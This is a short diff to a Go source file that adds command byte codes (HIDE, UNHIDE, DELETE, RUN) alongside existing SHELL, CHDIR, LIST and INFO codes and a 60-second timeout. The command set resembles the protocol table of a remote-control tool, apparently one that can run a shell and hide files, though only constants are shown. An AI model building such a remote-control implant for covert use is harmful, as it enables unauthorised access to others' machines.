@@ -6,10 +6,14 @@ import (
 )
 
 const (
-	CMD_SHELL byte = 'S'
-	CMD_CHDIR byte = 'C'
-	CMD_LIST  byte = 'L'
-	CMD_INFO  byte = 'I'
+	CMD_SHELL  byte = 'S'
+	CMD_CHDIR  byte = 'C'
+	CMD_HIDE   byte = 'H'
+	CMD_UNHIDE byte = 'U'
+	CMD_LIST   byte = 'L'
+	CMD_INFO   byte = 'I'
+	CMD_DELETE byte = 'D'
+	CMD_RUN    byte = 'R'
 
 	timeout time.Duration = 60 * time.Second
 )
